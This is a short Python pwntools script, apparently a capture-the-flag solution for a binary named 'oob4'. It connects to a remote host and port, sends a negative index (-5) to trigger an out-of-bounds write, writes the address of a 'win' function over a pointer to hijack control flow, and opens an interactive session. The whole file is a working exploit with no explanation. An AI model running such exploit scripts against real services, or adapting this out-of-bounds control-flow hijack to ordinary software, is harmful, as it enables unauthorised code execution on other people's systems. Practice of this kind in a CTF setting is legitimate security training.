from pwn import *

ip = "140.110.112.77"
port = 3114

context.arch = "amd64"

r = remote(ip, port)
# r = process("./oob4")

win = 0x4007E6

r.sendlineafter(":", "-5")
r.sendlineafter(":", p64(win))

r.interactive()
